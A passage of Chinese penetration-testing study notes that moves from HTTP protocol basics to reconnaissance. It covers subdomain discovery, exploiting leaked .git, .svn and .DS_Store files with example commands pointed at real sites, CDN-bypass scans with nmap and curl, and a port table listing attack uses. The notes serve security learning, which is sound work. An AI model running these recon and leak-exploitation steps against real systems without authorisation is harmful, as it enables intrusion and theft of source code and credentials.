请求）\n-\n是\n\n\n206\n\nPartial Content\n部分内容响应（支持分块下载或断点续传）\nContent-Range: bytes 0-499/2000\n是\n\n\n301\n3xx (重定向)\nMoved Permanently\n资源永久迁移，客户端应更新书签（SEO 权重转移）\nLocation: /new-url\n是\n\n\n302\n\nFound\n资源临时重定向，客户端保持原 URL（不转移 SEO 权重）\nLocation: /temp-url\n否\n\n\n304\n\nNot Modified\n资源未修改，客户端使用缓存（需配合 If-Modified-Since 头）\nETag, Last-Modified\n是\n\n\n307\n\nTemporary Redirect\n临时重定向且要求 HTTP 方法不变（如 POST 请求仍为 POST）\nLocation: /temp-redirect\n否\n\n\n308\n\nPermanent Redirect\n永久重定向且要求 HTTP 方法不变\nLocation: /new-path\n是\n\n\n400\n4xx (客户端错误)\nBad Request\n请求语法错误（如参数缺失、格式无效）\n-\n是\n\n\n401\n\nUnauthorized\n未提供有效身份凭证（需认证）\nWWW-Authenticate: Basic\n是\n\n\n403\n\nForbidden\n权限不足（如用户无权访问资源）\n-\n是\n\n\n404\n\nNot Found\n资源不存在（URL 错误或已删除）\n-\n是\n\n\n408\n\nRequest Timeout\n服务器等待请求超时（客户端发送过慢）\n-\n否\n\n\n429\n\nToo Many Requests\n客户端请求频率超限（触发速率限制）\nRetry-After: 60\n否\n\n\n500\n5xx (服务器错误)\nInternal Server Error\n服务器内部错误（代码异常、配置问题）\n-\n否\n\n\n502\n\nBad Gateway\n网关服务器收到上游无效响应（如 Nginx 后端服务崩溃）\n-\n否\n\n\n503\n\nService Unavailable\n服务暂时不可用（过载或维护）\nRetry-After: 3600\n否\n\n\n504\n\nGateway Timeout\n网关等待上游响应超时（如数据库查询超时）\n\n\n\n\n关键特性说明\n1.幂等性\n\n幂等操作（如 GET&#x2F;PUT&#x2F;DELETE）：多次重复请求效果相同，客户端可安全重试\n非幂等操作（如 POST）：重复请求可能导致资源重复创建，需谨慎处理\n\n2.重定向类型对比\n\n\n\n特性\n301&#x2F;308\n302&#x2F;307\n\n\n\n持久性\n永久\n临时\n\n\nSEO 影响\n转移权重\n保留原权重\n\n\n方法保持\n301 可改方法 308 禁止改方法\n302 可改方法 307 禁止改方法\n\n\n3.响应头（Response Headers）\n\n\n关键响应头\n作用\n\n\n\nContent-Type: text/html\n响应体类型（如 application/json）\n\n\nSet-Cookie: sessionId=...\n向客户端写入 Cookie（属性：HttpOnly、Secure、SameSite）\n\n\nCache-Control: max-age=3600\n缓存控制策略（如 public、no-cache）\n\n\nLocation: /new-path\n重定向目标地址（配合 3xx 状态码）\n\n\n4.响应体（Response Body）\n内容形式：HTML、JSON、图片等服务器返回的实际数据\n长度标识：Content-Length 或分块传输编码\n\n四、HTTP 方法全集\n\n\n方法\n语义\n幂等性\n安全性\n应用场景\n\n\n\nGET\n获取资源\n是\n是\n页面加载、API 数据查询\n\n\nPOST\n创建资源\n否\n否\n表单提交、文件上传\n\n\nPUT\n替换整个资源\n是\n否\n全量更新用户信息\n\n\nDELETE\n删除资源\n是\n否\n删除文章\n\n\nPATCH\n部分更新资源\n否\n否\n修改用户昵称\n\n\nHEAD\n获取资源元数据\n是\n是\n检查链接有效性\n\n\nOPTIONS\n查询服务器支持的方法\n是\n是\nCORS 预检请求\n\n\nTRACE\n诊断连接路径\n是\n是\n网络调试\n\n\n五、HTTPS 对数据包的影响\n加密层：在 HTTP 与 TCP 间插入 TLS&#x2F;SSL 协议（端口 443），对原始 HTTP 报文加密传输\n报文变化：\n明文 → 二进制加密数据（握手阶段协商对称密钥）\n保留 HTTP 语义，但无法直接读取内容（需解密）\n\n\n\n六、协议演进1.HTTP&#x2F;1.1\n持久连接（Connection: keep-alive）\n分块传输（Transfer-Encoding: chunked）\n\n2.HTTP&#x2F;2\n二进制分帧：将报文拆分为帧（Frame），多路复用提升效率\n头部压缩：HPACK 算法减少冗余\n\n3.HTTP&#x2F;3\n基于 QUIC 协议（UDP），解决队头阻塞\n\n七、补充\n\n\n\n八、思维导图\n信息打点一、Web 应用1.Web 单域名查询方法：\n\n备案信息\n企业产权\n注册域名\n反查解析\n\n2.Web 子域名（1）DNS 数据查询\n原理：通过解析域名的权威 DNS 记录（NS、MX、TXT、CNAME 等），挖掘隐含的子域名信息。DNS 协议响应中可能暴露管理后台、邮件服务器等关键子域。\n\n记录类型分析：\n\nNS记录：权威 DNS 服务器（如 ns1.example.com）\nMX记录：邮件服务器子域（如 mail.example.com）\nTXT记录：可能包含 SPF 策略或隐藏子域线索\n\n\n优缺点：\n\n✅ 直接获取权威数据，准确性高\n❌ 依赖 DNS 配置完整性，隐私保护域名信息可能缺失\n\n\n\n（2）证书查询\n原理：基于证书透明度（Certificate Transparency, CT）政策，CA 机构公开所有 SSL&#x2F;TLS 证书信息，证书中常包含主域名关联的子域名\n技术流程：\n证书日志聚合平台（如 crt.sh）抓取公开 CT 日志\n解析证书的 Subject Alternative Name (SAN) 字段，提取所有绑定域名\n关联同一组织证书，发现业务子域（如 api.example.com, dev.example.com）\n\n\n适用场景：\n发现 HTTPS 服务子域\n追踪证书更新历史中的废弃子域（如测试环境）\n\n\n\n（3）网络空间查询\n原理：通过扫描全网 IP 和开放端口，建立“IP-域名-服务”映射关系库，反向关联子域名\n数据关联技术：\nIP 反查：同一 IP 可能绑定多个子域名（如 CDN 节点）\n服务指纹识别：根据 HTTP 响应头、页面特征匹配归属组织\nASN 归属分析：通过 IP 段归属企业，推测未公开子域\n\n\n优势：覆盖范围广，可发现非标准 DNS 配置的资产\n\n（4）威胁情报查询\n原理：整合公开漏洞库、黑客论坛、恶意软件流量等数据源，提取攻击活动中暴露的子域名\n数据来源：\nVirusTotal：恶意文件通信域名、DNS 历史记录\nAlienVault OTX：众包威胁数据中的资产线索\nPassiveDNS：历史 DNS 解析存档（如 SecurityTrails）\n\n\n应用：\n发现钓鱼仿冒子域（如 login-example.com）\n定位 C&amp;C 服务器关联域名\n\n\n\n（5）枚举解析\n原理：通过字典轮询可能的子域名组合，向 DNS 服务器发起批量查询，筛选有效响应\n\n（6）对比与实战建议\n\n\n查询方式\n覆盖深度\n速度\n隐蔽性\n典型场景\n\n\n\nDNS 数据\n★★☆\n★★★\n★★☆\n快速获取权威记录\n\n\n证书查询\n★★★\n★★★★\n★★★★\nHTTPS 资产发现\n\n\n网络空间测绘\n★★★★\n★★☆\n★★★★\n全网资产关联分析\n\n\n威胁情报\n★★★☆\n★★★☆\n★★★★★\n对抗攻击溯源\n\n\n枚举解析\n★★★★★\n★☆\n★☆\n深度渗透测试（需授权）\n\n\n3.源码获取3.1.开源\n核心逻辑：开源项目具有普遍性和明显特征，可通过指纹识别快速定位框架类型，找到 cms，进而下载源码。\n实战技巧：\n对识别出的 CMS，访问其 /admin/login 等默认路径验证一致性；\n通过 GitHub 搜索特征字符串（如 JS 中的版权信息）定位源码仓库。\n\n\n\n3.2.闭源\n泄露的原因：\n\n1.从源码本身的特性入口\n2.从管理员不好的习惯入口\n3.从管理员不好的配置入口\n4.从管理员不好的意识入口\n5.从管理员资源信息搜集入口\n\n\n常见的 Web 源码泄露及其利用：\n\n\n（1）git 源码泄露\nGit 是一个开源的分布式版本控制系统，在执行 git init 初始化目录的时候，会在当前目录下自动创建一个 .git 目录，用来记录代码的变更记录等。发布代码的时候，如果没有把 .git 这个目录删除，就直接发布到了服务器上，攻击者就可以通过它来恢复源代码。\n\n漏洞利用工具：GitHack\n\ngithub 项目地址：https://github.com/lijiejie/GitHack\n\n用法示例：GitHack.py http://www.openssl.org/.git/ \n\n修复建议：删除.git 目录或者修改中间件配置进行对.git 隐藏文件夹的访问。\n\n\n（2）svn 源码泄露\nSVN 是一个开放源代码的版本控制系统。在使用 SVN 管理本地代码过程中，会自动生成一个名为.svn 的隐藏文件夹，其中包含重要的源代码信息。网站管理员在发布代码时，没有使用‘导出’功能，而是直接复制代码文件夹到 WEB 服务器上，这就使.svn 隐藏文件夹被暴露于外网环境，可以利用.svn&#x2F;entries 文件，获取到服务器源码。\n漏洞利用工具：Seay SVN 漏洞利用工具\n修复建议：删除 web 目录中所有.svn 隐藏文件夹，开发人员在使用 SVN 时，严格使用导出功能，禁止直接复制代码。\n\n（3）hg  源码泄露\nMercurial 是一种轻量级分布式版本控制系统，使用 hg init 的时候会生成.hg。\n漏洞利用工具：dvcs-ripper\n用法示例：rip-hg.pl -v -u http://www.example.com/.hg/\n\n（4）cvs 泄露\nCVS 是一个 C&#x2F;S 系统，多个开发人员通过一个中心版本控制系统来记录文件版本，从而达到保证文件同步的目的。主要是针对 CVS&#x2F;Root 以及 CVS&#x2F;Entries 目录，直接就可以看到泄露的信息。\n\n漏洞利用工具：dvcs-ripper\n\ngithub 项目地址：https://github.com/kost/dvcs-ripper.git\n\n运行示例：rip-cvs.pl -v -u http://www.example.com/CVS/\n\n\n（5）Bazaar&#x2F;bzr 泄露\nbzr 也是个版本控制工具, 虽然不是很热门, 但它也是多平台支持, 并且有不错的图形界面。\n\n运行示例：rip-bzr.pl -v -u http://www.example.com/.bzr/\n\n\n（6）网站备份压缩文件\n管理员将网站源代码备份在 Web 目录下，攻击者通过猜解文件路径，下载备份文件，导致源代码泄露。\n常见的备份文件后缀：\n.rar\n.zip\n.tar.gz\n.bak\n.txt\n.old\n.temp\n\n\n测试工具用扫描的就行\n\n（7）WEB-INF&#x2F;web.xml 泄露\nWEB-INF 是 Java 的 WEB 应用的安全目录，如果想在页面中直接访问其中的文件，必须通过 web.xml 文件对要访问的文件进行相应的映射才能访问。\nWEB-INF 主要包含以下文件或目录：\n\n12345WEB-INF/web.xml : Web应用程序配置文件, 描述了servlet和其他的应用组件配置及命名规则.WEB-INF/database.properties : 数据库配置文件WEB-INF/classes/ : 一般用来存放Java类文件(.class)WEB-INF/lib/ : 用来存放打包好的库(.jar)WEB-INF/src/ : 用来放源代码(.asp和.php等)\n\n\n通过找到 web.xml 文件，推断 class 文件的路径，最后直接 class 文件，在通过反编译 class 文件，得到网站源码。\n\n（8）DS-Store 文件泄露\n.DS_Store 是 Mac 下 Finder 用来保存如何展示 文件&#x2F;文件夹 的数据文件，每个文件夹下对应一个。如果将.DS_Store 上传部署到服务器，可能造成文件目录结构泄漏，特别是备份文件、源代码文件。\ngithub 项目地址：https://github.com/lijiejie/ds_store_exp\n用法示例：ds_store_exp.py http://hd.zj.qq.com/themes/galaxyw/.DS_Store\n\n（9）SWP 文件泄露\nswp 即 swap 文件，在编辑文件时产生的临时文件，它是隐藏文件，如果程序正常退出，临时文件自动删除，如果意外退出就会保留，文件名为 .filename.swp。\n漏洞利用：直接访问.swp 文件，下载回来后删掉末尾的.swp，获得源码文件。\n\n（10）GitHub 源码泄露\nGitHub 是一个面向开源及私有软件项目的托管平台，很多人喜欢把自己的代码上传到平台托管。攻击者通过关键词进行搜索，可以找到关于目标站点的敏感信息，甚至可以下载网站源码。\n类似的代码托管平台还有很多，人才是最大的漏洞。\nGitHub 深度搜索：\n语法组合：in:readme 公司名 + language:php 定位内部项目；\n特征提取：扫描 JS&#x2F;CSS 中的邮箱、API 密钥，反查员工公开仓库。\n\n\n\n3.3.黑灰产业源码商城\n通过谷歌搜索博彩源码商城、约友程序批发的关键词，定位境外平台（如 CodeCanyon 擦边板块）\n\n4.JS 前端架构4.1.什么是 JS 渗透测试？\n在 Javascript 中也存在变量和函数，当存在可控变量及函数调用即可参数漏洞\nJS 开发的 WEB 应用和 PHP，JAVA, NET 等区别在于即没有源代码，也可以通过浏览器的\n查看源代码获取真实的点。获取 URL，获取 JS 敏感信息，获取代码传参等，所以相当于\nJS 开发的 WEB 应用属于白盒测试（默认有源码参考），一般会在 JS 中寻找更多的 URL\n地址，在 JS 代码逻辑（加密算法，APIkey 配置，验证逻辑等）进行后期安全测试。\n\n前提：Web 应用可以采用后端或前端语言开发\n\n后端语言：php java python .NET 浏览器端看不到真实的源代码\n前端语言：JavaScript(JS)和 JS 框架 浏览器端看到真实的源代码\n\n\n例子：\n\nzblog：核心功能采用 PHP 语言去传输接受\nvue.js：核心功能采用框架语法（JS）传输接受\n\n\n\n4.2. JS 泄漏的攻击面1.敏感信息硬编码\n\n凭证泄露：API 密钥、数据库密码、云服务 AK&#x2F;SK 直接写在 JS 中（如阿里云 OSS 密钥），攻击者可直接调用云服务 API 篡改数据。\n用户隐私：姓名、手机号、身份证号未经脱敏渲染至前端（如某 FM 应用评论模块泄露用户邮箱）。\n测试数据残留：生产环境保留测试账号 Token，导致未授权登录后台\n\n2.接口路径暴露\n\n后台管理路径：JS 注释或配置中遗留调试接口（如 /admin/console、/api/internal），暴露攻击入口。\n未授权 API：前端路由配置泄露无需认证的 API（如数据查询接口），可被爬虫批量利用。\n\n3.系统架构信息\n\n技术栈标识：JS 引入文件路径（如 /static/js/app.js）暴露框架类型（Vue&#x2F;React）\n版本控制痕迹：.map 文件泄露源码映射，便于逆向分析。\n\n4.3.流行的 JS 框架\nVue NodeJS jQuery Angular 等\n\n4.4. JS 开发应用的判定\n插件 wappalyzer\n源程序代码简短\n引入多个 js 文件\n一般有&#x2F;static&#x2F;js&#x2F;app.js 等顺序的 js 文件\n一般 cookie 中有 connect.sid\n\n4.5. JS 信息提取技术方法1.手工提取\n\n浏览器进行抓包检查\n全局关键字\n\n123456789src=path=method:&quot;get&quot;http.get (&quot;method:&quot;post&quot;http.post (&quot;$.ajaxhttp://service.httpposthttp://service.httpget\n\n\n\n2.半自动提取\n\nBurp Suite 插件：\n自带功能：Target-&gt; sitemap-&gt; Engagement tools-&gt; Find scripts (脚本查找敏感信息)\n官方插件：JS Miner、JS Link Finder\n第三方插件：HaE、Unexpected_information\n插件加载器：jython-standalone-2.7.2\n\n\n\n3.自动提取\n\n\n\n工具类型\n代表工具\n功能\n\n\n\nURL&#x2F;子域名提取\nJSFinder、URLFinder\n快速爬取 JS 中的接口路径和子域名\n\n\n敏感信息扫描\nHaE、FindSomething(浏览器插件)\n标记 JS 中的密钥、手机号、邮箱等敏感数据\n\n\nWebPack 解析\nPacker-Fuzzer、jjjjjjs\n解构 Webpack 打包的 JS 文件，提取隐藏接口\n\n\nFUZZ 测试\nffuf\n用 fuzz 爆破更多 JS，对提取的路径进行模糊测试，探测未授权访问\n\n\n4.6.高危漏洞案例1.后台路径泄露 → 云存储沦陷\n\n某网站 JS 文件泄露后台路径 /admin/config-backup，攻击者访问后获取 OSS 的 AK&#x2F;SK，最终控制云存储桶删改文件。\n\n2.身份凭证硬编码 → 管理员权限获取\n\n前端 JS 内嵌测试账号 Token，攻击者替换登录包中的 Token 直接进入后台。\n\n3.用户数据无脱敏 → 批量隐私泄露\n\n某平台服务端返回用户身份证号、银行卡号至前端，通过源码查看可爬取全站用户隐私。\n\n5.识别防火墙\nWAF：Web 应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称：WAF）。利用国际上公认的一种说法：Web 应用防火墙是通过执行一系列针对 HTTP&#x2F;HTTPS 的安全策略来专门为 Web 应用提供保护的一款产品。\n\nWAF 分类：\n\n云 WAF：百度安全宝、阿里云盾、长亭雷池，华为云，亚马逊云等\n硬件 WAF：绿盟、安恒、深信服、知道创宇等公司商业产品\n软件 WAF：宝塔，安全狗、D 盾等\n代码级 WAF：自己写的 waf 规则，防止出现注入等，一般是在代码里面写死的\n\n\n识别方法：\n\n看图识别：拦截页面，identywaf 项目内置\n识别项目：wafw00f   https://github.com/EnableSecurity/wafw00f\n\n\n\n6.蜜罐\n概念：蜜罐是一种安全威胁的检测技术，其本质在于引诱个欺骗攻击者，并且通过记录攻击者的攻击日志来产生价值。安全研究人员可以通过分析蜜罐的被攻击记录推测攻击者的意图和手段等信息。攻击方可以通过蜜罐识别技术来发现和规避蜜罐。因此，我们有必要站在红队的角度钻研蜜罐识别的方式方法\n\n识别：指纹识别，网络空间识别，常用端口，连续端口等。\n\n技术分类与特点：\n\n\n\n\n\n类型\n交互层级\n优势与局限\n\n\n\n低交互蜜罐\n模拟基础服务响应\n部署简单、低风险，但易被识别（如 Honeyd）。\n\n\n高交互蜜罐\n运行完整 OS&#x2F;应用\n捕获深度攻击数据，但维护成本高（如 Nepenthes）。\n\n\n\n7.CDN 绕过一、CDN 介绍（1）前置知识\n\n传统访问：用户访问域名–&gt; 解析服务器 IP–&gt; 访问目标主机\n\n普通 CDN：用户访问域名–&gt; CDN 节点–&gt; 真实服务器 IP–&gt; 访问目标主机\n\n带 WAF 的 CDN：用户访问域名–&gt; CDN 节点（WAF）–&gt; 真实服务器 IP–&gt; 访问目标主机\n\n\n（2）CDN 的三种配置\n\n配置 1：加速域名-需要启用加速的域名\n配置 2：加速区域-需要启用加速的地区\n配置 3：加速类型-需要启用加速的资源\n\n（3）CDN 核心作用与绕过必要性\n 1.CDN 的核心功能\n\n隐藏源站 IP：通过边缘节点代理用户请求，使攻击者无法直接定位真实服务器。\n加速与负载均衡：缓存静态资源，减少源站压力，提升访问速度\n安全防护：集成 WAF、DDoS 防御等能力（如 Cloudflare）\n\n2.为何要绕过 CDN\n\n渗透测试需求：定位真实 IP 以测试源站漏洞（如未修复的 0day）。\n应急响应：当 CDN 节点故障时，需直接访问源站排查问题。\n\n（4）识别\n\nnslookup（不重要）\n多地服务器 ping 判断\n\n二、绕过方法1.子域名挖掘\n原理：主站启用 CDN，但子域名（如 mail.example.com）常因配置遗漏暴露真实 IP。\n操作：ping 子域名得到不一样的 ip，然后查看备案，如果感觉像，就尝试 host（hosts Administrator）绑定 ip，ping 下主域名，强制解析到那个 ip 上\n\n2.历史 DNS 记录查询（老域名适用）\n原理：域名启用 CDN 前的解析记录可能留存于公共数据库。\n工具与平台：\nSecurityTrails：查看历史 A 记录，过滤 CDN IP\nViewDNS：提供 10 年内的解析历史\n微步在线：国内域名历史记录精准\n\n\n技巧：优先选择 最早解析的 IP，大概率是源站。\n\n3.SSL 证书反查\n原理：同一服务器证书可能关联多个域名，暴露真实 IP。\n操作：\n访问 https://example.com 获取证书 HASH。\n在 Censys 搜索 parsed.names: example.com，筛选 IP 归属。\n\n\n优势：绕过 CDN 缓存，直接定位服务器。\n\n4.国外节点访问\n原理：企业 CDN 可能未覆盖冷门地区（如南美、非洲），直连源站\n实操：\n工具：使用国外 VPS（如 AWS 巴西节点）直接访问目标域名。\n在线平台：tools.ipip.net/cdn.php 模拟全球 Ping 测试。\n\n\n注意：部分 CDN 已支持全球覆盖，需结合其他方法验证。\n\n5.邮件服务溯源\n原理：企业邮箱（如 admin@example.com）发送邮件时，邮件头常含源站 IP。\n步骤：\n1.触发邮件（密码重置&#x2F;RSS 订阅）。\n2.查看邮件原文，搜索 Received: 字段：\n\n\n其他方法：通过发送错误邮件，让他的真实 ip 给你返回错误的信息，但需要有一个自己的收邮箱的服务器（qq 邮箱等不行）\n\n6.网络空间获取\n不准，但可以与自己找到的进行对比验证\n\n7.全面扫描\n原理：扫描全网 IP，匹配目标特征（如 favicon 哈希、HTTP 标题）\n操作：先确定是什么 cdn 提供服务，然后用纯真库找对应 cdn 大概位置的 ip 范围，然后将网站标题写入进去，进行扫描开放的端口对比信息，拿到真实 ip\n局限：耗时长，易触发安全告警。\n\n8.非标准端口探测\n原理：CDN 通常只代理 80&#x2F;443 端口，SSH(22)、RDP(3389)等端口直连源站\n操作：\n\n1nmap -sS -p22,3389,3306 example.com  # 扫描非Web端口\n\n\n案例：某银行主站 CDN 防护，但 3389 端口开放且 IP 非 CDN 段，暴露源站.\n\n9.HTTP 标头篡改\n原理：篡改 Host 头，诱使 CDN 返回源站错误信息。\n测试命令：\n\n1curl -H &quot;Host: example.com&quot; http://CDN_IP -v\n\n\n成功标志：返回 404 或源站特有错误页。\n\n10.协议差异绕过\n场景：CDN 仅配置 HTTPS 时，访问 HTTP 可能直连源站\n验证：\n\n1curl http://example.com  # 返回真实IP或错误信息\n\n11.总结📊 方法对比与工具推荐\n\n\n\n方法\n适用场景\n工具推荐\n成功率\n操作难度\n\n\n\n子域名挖掘\n多子域名企业\nSublist3r + Dig\n★★★★☆\n★★☆☆☆\n\n\n历史 DNS 查询\n运营超 1 年的老域名\nSecurityTrails\n★★★☆☆\n★☆☆☆☆\n\n\n邮件溯源\n自建邮箱系统\n手动触发+邮件头分析\n★★★★☆\n★★☆☆☆\n\n\n国外访问\n未覆盖全球的 CDN\nVPS + cURL\n★★☆☆☆\n★★★☆☆\n\n\n全网扫描\n特征明显的网站\nMasscan + FOFA\n★★★★★\n★★★★☆\n\n\n非标准端口探测\n多端口服务\nNmap\n★★★☆☆\n★★★☆☆\n\n\n\n首选组合：子域名挖掘 + 历史DNS查询 + 邮件溯源 覆盖 90%场景。\n高阶突破：特征扫描（favicon&#x2F;证书）适用于顽固目标。\n\n8.框架组件一、基础内容\n框架：简单代码的一个整合库，如果使用框架就只需要学习使用框架调用即可如：文件上传功能是需要很多代码来实现的，框架把这个代码进行封封装，调用即可影响：如果采用框架开发，代码的安全性是取决于框架的过滤机制\n\n组件：第三方的功能模块（日志记录，数据监控，数据转换等）\n\nWeb 架构：\n\n1、最简单最入门的开发模型（功能代码全部手写）\n最容易出现漏洞，程序员水平不一，没有第三方或团队的检测，单纯的自己写\n\n\n2、结合开发框架的开发模型（以框架为核心实现功能）\n第三方或团队的开发的封装代码框架，一般内置的过滤机制（框架漏洞）\n\n\n3、结合开发框架外加组件模型（以框架为核心，组件为辅实现功能）\n第三方或团队的开发的封装代码框架，一般内置的过滤机制（框架和组件漏洞）\n\n\n\n\n\n二、框架识别特征python-开发框架\nDjango：识别插件，Set-Cookie: expires &#x3D;\n\nFlask：识别插件，Set-Cookie: expires &#x3D;\n\n\nPHP-开发框架\nThinkPHP：\n识别插件\nX-Powered-By：ThinkPHP\nCMS 识别到源码体系 TP 开发\n\n\nLaravel：识别插件，Set-Cookie 中特征的格式\nYii：识别插件，Set-Cookie 中特征的格式\n\nJAVA-开发框架\nFastjson&#x2F;Jackson：\n在提交 JSON 数据包中修改测试，Fastjson 组件会把 01 解析成 1，Jackson 组件在解析 01 是会抛出异常\nhttps://forum.butian.net/share/1679\nhttps://www.iculture.cc/forum-post/24115.html\n\n\nShiro：\n请求包的 cookie 中存在 rememberMe 字段。\n返回包中存在 set-Cookie：&#x3D;&#x3D;rememberMe &#x3D; deleteMe&#x3D;&#x3D;\n请求包中存在 rememberMe &#x3D; x 时，响应包中存在 rememberMe &#x3D; deleteMe\n有时候服务器不会主动返回 rememberMe &#x3D; deleteMe, 直接发包即可，将 Cookie 内容改为 rememberMe &#x3D; 1，若相应包有 rememberMe &#x3D; deleteMe，则基本可以确定网站是 apache shiro 搭建的\n\n\nStrusts2：一般使用 struts2 框架后缀带 do 或 action，可以尝试进行利用\nSpringboot：\n通过 web 应用程序网页标签的小绿叶图标\n通过 Springboot 框架默认报错页面\n\n\nSolr：一般开放 8983 端口，访问页面也可以探针到\n\n二、主机服务器1.端口扫描\n基础概念：在计算机网络通信中，端口是应用程序或服务用于监听传入连接或发送传出数据的逻辑端点。每个端口都由一个 16 位的数字标识，范围从 0 到 65535\n\n端口的重要性：\n\n服务识别：特定端口通常与特定服务关联，例如，80 端口用于 HTTP 服务，443 端口用于 HTTPS 服务，22 端口用于 SSH 服务。通过识别开放端口，我们可以推断目标系统可能提供的功能。\n安全评估：开放了不必要的端口或运行着已知漏洞的服务，都可能成为攻击者的入口。端口扫描是安全审计和渗透测试的第一步。\n网络故障排查：确定服务是否正常运行，可以通过检查其监听的端口状态来判断。\n\n\n端口分类：\n\n**知名端口(Well-Known Ports)**：0-1023，由 IANA(Internet Assigned Numbers Authority)分配和控制，用于常见的网络服务，如 HTTP(80), FTP(21), SSH(22)等。\n**注册端口(Registered Ports)**：1024-49151，可由用户或应用程序注册，用于特定的应用程序或服务。\n**动态&#x2F;私有端口(Dynamic&#x2F;Private Ports)**：49152-65535，通常由客户端程序随机选择，用于临时通信。\n\n\n端口扫描工具：Nmap（综合）、Masscan（快速）、网络空间（方便）\n\n\n\n\n\n端口\n协议\n服务\n渗透用途\n\n\n\n20,21\nTCP\nFTP\n匿名上传下载、爆破、嗅探、Windows 提权、远程执行（如 proftpd 1.3.5）、后门利用（如 vsftpd 2.3.4）\n\n\n22\nTCP\nSSH\n爆破、SSHv1 中间人攻击、隧道代理、内网转发、文件传输\n\n\n23\nTCP\nTelnet\n爆破、嗅探（常见于路由器&#x2F;交换机弱口令）\n\n\n25\nTCP\nSMTP\n邮件伪造、VRFY/EXPN 用户枚举（工具：smtp-user-enum）\n\n\n53\nTCP&#x2F;UDP\nDNS\n区域传送劫持、DNS 投毒、欺骗、DNS 隧道远控\n\n\n69\nTCP&#x2F;UDP\nTFTP\n下载重要配置文件（如网络设备配置）\n\n\n80-89, 443\nTCP\nWeb 服务\nWeb 漏洞利用（注入、XSS、框架漏洞）、控制台爆破（如 OWA, VPN, Webmail）\n\n\n110\nTCP\nPOP3\n爆破、嗅探\n\n\n111, 2049\nTCP\nNFS\n权限配置不当导致未授权访问\n\n\n137,139,445\nTCP\nSamba\n爆破、漏洞利用（MS08-067, MS17-010）、嗅探\n\n\n143\nTCP\nIMAP\n爆破 5\n\n\n161\nUDP\nSNMP\n默认团体字符串爆破、内网信息搜集\n\n\n389\nTCP\nLDAP\n注入、匿名访问、弱口令\n\n\n512-514\nTCP\nLinux rexec\n爆破、rlogin 登录\n\n\n873\nTCP\nRsync\n匿名访问、文件上传\n\n\n1194\nTCP\nOpenVPN\n钓取 VPN 账号进入内网\n\n\n1352\nTCP\nLotus\n弱口令、信息泄漏\n\n\n1433\nTCP\nSQL Server\n注入、提权、sa 弱口令爆破\n\n\n1521\nTCP\nOracle\nTNS 协议爆破、注入、反弹 Shell\n\n\n1723\nTCP\nPPTP\n爆破、钓取 VPN 账号\n\n\n2181\nTCP\nZooKeeper\n未授权访问\n\n\n3306\nTCP\nMySQL\n注入、提权、弱口令爆破\n\n\n3389\nTCP\nRDP\nShift 后门（Windows Server 2003 以下）、爆破、MS12-020 漏洞\n\n\n3690\nTCP\nSVN\n源码泄露、未授权访问\n\n\n4848\nTCP\nGlassFish\n弱口令\n\n\n5432\nTCP\nPostgreSQL\n爆破、注入、弱口令\n\n\n5900-5902\nTCP\nVNC\n弱口令爆破\n\n\n5984\nTCP\nCouchDB\n未授权导致的任意指令执行\n\n\n6379\nTCP\nRedis\n未授权访问、弱口令爆破\n\n\n7001-7002\nTCP\nWebLogic\nJava 反序列化、弱口令\n\n\n8080-8089\nTCP\nJenkins&#x2F;JBoss\n反序列化、控制台弱口令\n\n\n9200,9300\nTCP\nElasticSearch\n远程代码执行（如 CVE-2015-1427）\n\n\n11211\nTCP\nMemcached\n未授权访问（可被用于 DDoS 放大攻击）\n\n\n27017-27018\nTCP\nMongoDB\n爆破、未授权访问\n\n\n50070,50030\nTCP\nHadoop\n默认端口未授权访问（如信息泄露）\n\n\n三、APP 应用1.信息分类\n资产信息：\nip-端口服务、域名-Web安全、接口-API安全\n\n\n泄露信息：\n邮箱配置、接口配置、oss配置\n\n\n代码信息：\nJAVA代码安全问题\n\n\n\n2.获取APP\n从名称获取APP信息：爱企查、小蓝本、七麦、点点\n\n1234https://www.xiaolanben.com/https://aiqicha.baidu.com/https://www.qimai.cn/https://app.diandian.com/\n\n\nURL获取APP信息：\n查备案信息在搜\n网站上有APP下载\n市场直接搜单位名称\n\n\n\n3.提取技术\n三种方式及其表现：\n抓包-动态表现\n提取-静态表现&amp;动态调试\n搜索-静态表现\n\n\n\n（1）抓包表现出来的数据\n优点：没有误报\n缺点，无法做到完整\n\n（2）反编译从源码中提取数据\n优点：数据比较完整\n缺点：有很多无用资产信息\n\n（3）动态调试从表现中提取数据\n优点：\n\n没有误报，解决不能抓包不能代理的情况\n搞逆向的能看到实时的app调用链等\n\n\n缺点：无法做到完整\n\n案列：某 APP 打开无数据包，登录有数据包（反编译后未找到目标资产，抓包住到了）\n\n原因：那个登录界面是 APP 打包的资源，并没有对外发送数据\n\n静态分析工具：\n\nMobsf（也可以动态调试+模拟器）\nAppInfoScanner\n在线平台：https://www.zhihuaspace.cn:8888/、https: / /mogua.co/\n\n\n\n四、小程序应用1.获取小程序\n直接搜索关键字就行\n常见小程序的应用：微信、支付宝、百度、抖音头条\n\n2.小程序结构\n主体结构：小程序包含一个描述整体程序的 app 和多个描述各自页面的 page。一个小程序主体部分(即 app)由三个文件组成，必须放在项目的根目录，如下：\n\n\n\n\n文件\n必需\n作用\n\n\n\napp.js\n是\n小程序逻辑\n\n\napp.json\n是\n小程序公共配置\n\n\napp.wxss\n否\n小程序公共样式表\n\n\n\n一个小程序页面由四个文件组成，分别是：\n\n\n\n\nxxx.js\n页面\n\n\n\nxxx.json\n页面配置\n\n\nxxx.wxml\n页面结构\n\n\nxxx.wxss\n页面样式\n\n\n\n项目整体目录结构：\n\n\n\n\npages\n页面文件夹\n\n\n\nindex\n首页\n\n\nlogs\n日志\n\n\nutils\n\n\n\nutil\n工具类(mina 框架自动生成,你也可以建立一个：api)\n\n\napp.js\n入口 js(类似于 java 类中的 main 方法)、全局 js\n\n\napp.json\n全局配置文件\n\n\napp.wxss\n全局样式文件\n\n\nproject.config.json\n跟你在详情中勾选的配置一样\n\n\nsitemap.json\n用来配置小程序及其页面是否允许被微信索引\n\n\n3.提取技术\n微信路径：设置-文件管理-路径下&#x2F;Appiet\n\n逆向静态提取：解包、反编译\n\n动态抓包提取：Proxifier、Burpsuite\n\n动态调试提取:小程序助手、官方开发工具\n\n\n五、微信公众号\n获取微信公众号途径：https://weixin.sogou.com/\n微信公众号有无第三方服务\n\n六、其他1.Github监控-开发&amp;配置&amp;源码\n目标中开发人员或者托管公司上传的项目存在源码泄漏或配置信息（密码密匙等），人员数据库等敏感信息，找到多个脆弱点。\n人员&amp;域名&amp;邮箱等筛选\neg：xxx.cn password 